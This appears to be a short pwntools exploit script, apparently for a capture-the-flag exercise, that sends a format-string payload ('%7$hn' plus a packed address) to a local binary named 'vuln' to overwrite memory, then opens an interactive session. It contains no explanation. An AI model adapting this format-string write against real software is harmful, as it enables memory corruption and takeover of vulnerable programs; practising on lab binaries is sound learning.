from pwn import *
p = process('./vuln')

target = 0x4040b0
payload = b'aaa%7$hn'+p64(target)
p.sendline(payload)
p.interactive()
